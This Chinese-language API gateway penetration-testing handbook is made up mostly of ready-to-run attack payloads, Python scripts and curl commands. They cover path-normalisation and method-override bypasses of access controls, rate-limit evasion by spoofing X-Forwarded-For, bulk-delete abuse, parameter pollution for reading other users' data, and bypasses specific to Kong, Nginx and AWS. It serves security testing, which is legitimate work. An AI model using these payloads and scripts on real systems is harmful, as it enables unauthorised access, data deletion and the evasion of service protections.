# API 网关安全测试手册

## 一、路径规范化绕过

### 1.1 原理

```
API 网关和后端服务对路径的规范化处理不一致

网关: /api/admin → 拒绝访问
后端: /api/./admin → 规范化为 /api/admin → 允许访问

结果: 绕过网关的访问控制
```

### 1.2 常见 Payload

```bash
# 点号绕过
/api/./admin
/api/admin/.
/api/./admin/.

# 双斜杠
/api//admin
/api///admin

# URL 编码
/api/%2e/admin
/api/%2e%2e/admin
/api/%2f/admin

# 分号绕过（Spring Boot）
/api/;/admin
/api/admin;/

# 反斜杠（Windows）
/api\admin
/api\\admin

# 混合
/api/.;/admin
/api/;./admin
/api/%2e;/admin
```

### 1.3 测试脚本

```python
import requests

def test_path_normalization(base_url, protected_path):
    """测试路径规范化绕过"""
    
    payloads = [
        f"{protected_path}",
        f"./{protected_path}",
        f"{protected_path}/.",
        f"/{protected_path}",
        f"//{protected_path}",
        f"/{protected_path.replace('/', '%2f')}",
        f"/{protected_path.replace('/', '%2e/')}",
        f";/{protected_path}",
        f"{protected_path};/",
        f"/.;/{protected_path}",
    ]
    
    for payload in payloads:
        url = f"{base_url}{payload}"
        r = requests.get(url)
        
        print(f"[{r.status_code}] {payload}")
        
        if r.status_code == 200:
            print(f"    [!] 可能绕过成功")
            print(f"    响应长度: {len(r.text)}")

# 使用示例
test_path_normalization("https://target.com", "/api/admin")
```

---

## 二、HTTP 方法覆盖

### 2.1 原理

```
某些 API 网关支持通过请求头覆盖 HTTP 方法

GET /api/user/123 → 只读，允许
DELETE /api/user/123 → 删除，拒绝

GET /api/user/123
X-HTTP-Method-Override: DELETE
→ 网关看到 GET，放行
→ 后端看到 DELETE，执行删除
```

### 2.2 常见请求头

```bash
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
X-HTTP-Method: DELETE
X-Method: DELETE
_method: DELETE
```

### 2.3 测试脚本

```bash
# 测试方法覆盖
curl -X GET "https://target.com/api/user/123" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer TOKEN"

curl -X POST "https://target.com/api/user/123" \
  -H "X-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'
```

---

## 三、API 版本回退

### 3.1 原理

```
旧版本 API 可能缺少安全检查

/v2/api/user → 有权限检查
/v1/api/user → 无权限检查（已废弃但未下线）
```

### 3.2 测试方法

```bash
# 枚举 API 版本
curl "https://target.com/v1/api/user"
curl "https://target.com/v2/api/user"
curl "https://target.com/v3/api/user"
curl "https://target.com/api/v1/user"
curl "https://target.com/api/v2/user"

# 测试旧版本是否有漏洞
# 1. 权限检查缺失
# 2. 输入验证不足
# 3. 已知漏洞未修复
```

### 3.3 自动化脚本

```python
def test_api_versions(base_url, endpoint):
    """测试 API 版本回退"""
    
    versions = ["v1", "v2", "v3", "v4", "v5"]
    patterns = [
        f"/{{}}/{endpoint}",
        f"/{endpoint}/{{}}",
        f"/api/{{}}/{endpoint}",
        f"/api/{endpoint}/{{}}",
    ]
    
    for version in versions:
        for pattern in patterns:
            path = pattern.format(version)
            url = f"{base_url}{path}"
            
            r = requests.get(url)
            
            if r.status_code != 404:
                print(f"[{r.status_code}] {path}")
                
                # 测试是否有权限检查
                r_unauth = requests.get(url)  # 不带 token
                if r_unauth.status_code == 200:
                    print(f"    [!] 无权限检查")
```

---

## 四、速率限制绕过

### 4.1 X-Forwarded-For 轮换

```python
import requests
import random

def bypass_rate_limit_xff(url, count=100):
    """通过轮换 X-Forwarded-For 绕过速率限制"""
    
    for i in range(count):
        # 生成随机 IP
        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        headers = {
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Originating-IP": fake_ip,
        }
        
        r = requests.get(url, headers=headers)
        print(f"[{i+1}] {fake_ip} → {r.status_code}")
        
        if r.status_code == 429:
            print("    速率限制仍然生效")
            break
```

### 4.2 API Key 轮换

```python
def bypass_rate_limit_keys(url, api_keys):
    """通过轮换 API Key 绕过速率限制"""
    
    for i, key in enumerate(api_keys):
        r = requests.get(url, headers={"X-API-Key": key})
        print(f"[{i+1}] Key {key[:10]}... → {r.status_code}")
```

### 4.3 端点变体

```bash
# 相同功能的不同端点可能有独立的速率限制

# 端点 1
curl "https://target.com/api/search?q=test"

# 端点 2（相同功能）
curl "https://target.com/api/v2/search?q=test"
curl "https://target.com/search?q=test"
curl "https://target.com/api/query?keyword=test"
```

---

## 五、API 文档泄露

### 5.1 常见路径

```bash
# Swagger / OpenAPI
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api-docs.json
/v2/api-docs
/v3/api-docs
/swagger-ui.html
/swagger-ui/
/api/swagger.json
/api/swagger-ui.html

# GraphQL
/graphql
/graphiql
/graphql/schema
/graphql/console

# RAML
/api.raml
/raml/api.raml

# API Blueprint
/api.apib
/apiary.apib

# WADL
/application.wadl
/api/application.wadl
```

### 5.2 自动化扫描

```bash
# ffuf 批量检测
ffuf -u "https://target.com/FUZZ" \
  -w api-docs-paths.txt \
  -mc 200,301,302 \
  -o api-docs-results.json

# 从 JS 文件中提取 API 文档 URL
grep -rE "(swagger|openapi|api-docs)" *.js
```

### 5.3 利用 API 文档

```python
import requests
import json

def exploit_swagger(swagger_url):
    """从 Swagger 文档中提取所有端点"""
    
    r = requests.get(swagger_url)
    swagger = r.json()
    
    base_path = swagger.get('basePath', '')
    paths = swagger.get('paths', {})
    
    endpoints = []
    
    for path, methods in paths.items():
        for method, details in methods.items():
            endpoint = {
                'path': base_path + path,
                'method': method.upper(),
                'summary': details.get('summary', ''),
                'parameters': details.get('parameters', []),
            }
            endpoints.append(endpoint)
    
    return endpoints

# 使用示例
endpoints = exploit_swagger("https://target.com/swagger.json")

for ep in endpoints:
    print(f"{ep['method']} {ep['path']}")
    print(f"  {ep['summary']}")
    
    # 测试每个端点
    # ...
```

---

## 六、批量操作滥用

### 6.1 原理

```
批量 API 可能绕过单条记录的限制

单条: POST /api/user → 速率限制 10次/分钟
批量: POST /api/users/batch → 速率限制 10次/分钟，但每次可处理100条

结果: 实际可处理 1000条/分钟
```

### 6.2 测试方法

```bash
# 查找批量端点
/api/users/batch
/api/users/bulk
/api/users/import
/api/batch
/api/bulk

# 测试批量操作
curl -X POST "https://target.com/api/users/batch" \
  -H "Content-Type: application/json" \
  -d '{
    "users": [
      {"id": 1, "action": "delete"},
      {"id": 2, "action": "delete"},
      ...
      {"id": 1000, "action": "delete"}
    ]
  }'
```

---

## 七、参数污染（HPP）

### 7.1 原理

```
网关和后端对重复参数的处理不一致

请求: /api/user?id=1&id=2

网关: 取第一个 id=1 → 检查权限（自己的 ID）→ 放行
后端: 取最后一个 id=2 → 返回他人数据

结果: 越权访问
```

### 7.2 测试方法

```bash
# 重复参数
curl "https://target.com/api/user?id=MY_ID&id=VICTIM_ID"

# 数组参数
curl "https://target.com/api/user?id[]=MY_ID&id[]=VICTIM_ID"

# JSON 参数污染
curl -X POST "https://target.com/api/user" \
  -H "Content-Type: application/json" \
  -d '{"id": "MY_ID", "id": "VICTIM_ID"}'
```

---

## 八、Kong 特定绕过

### 8.1 路径规范化

```bash
# Kong 对路径的处理
/api/admin → 拒绝
/api/%61dmin → 绕过（URL 解码）
/api/admin%2f → 绕过（尾部斜杠）
```

### 8.2 插件绕过

```bash
# Kong 插件可能有配置错误

# 测试 JWT 插件
curl "https://target.com/api/protected" \
  -H "Authorization: Bearer invalid_token"

# 测试 ACL 插件
curl "https://target.com/api/admin" \
  -H "X-Consumer-Groups: admin"
```

---

## 九、Nginx 特定绕过

### 9.1 merge_slashes

```bash
# Nginx merge_slashes off 时
/api//admin → 不合并斜杠
/api///admin → 可能绕过规则
```

### 9.2 proxy_pass 配置错误

```nginx
# 错误配置
location /api/ {
    proxy_pass http://backend/;
}

# 请求: /api/../admin
# 转发: http://backend/../admin → http://backend/admin
```

---

## 十、AWS API Gateway 特定绕过

### 10.1 资源策略绕过

```bash
# 测试 IP 白名单
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "X-Forwarded-For: 允许的IP"
```

### 10.2 Lambda 授权器绕过

```bash
# 测试授权器逻辑
curl "https://api-id.execute-api.region.amazonaws.com/prod/endpoint" \
  -H "Authorization: Bearer malformed_token"

# 观察错误信息，可能泄露授权逻辑
```

---

## 十一、测试工具

### Arjun（参数发现）

```bash
# 安装
pip3 install arjun

# 发现隐藏参数
arjun -u https://target.com/api/user

# 可能发现: debug=1, internal=1, admin=true
```

### Kiterunner（API 端点发现）

```bash
# 安装
go install github.com/assetnote/kiterunner@latest

# 扫描 API 端点
kr scan https://target.com -w routes.txt

# 使用 Assetnote 词表
kr scan https://target.com -A=apiroutes-210228
```

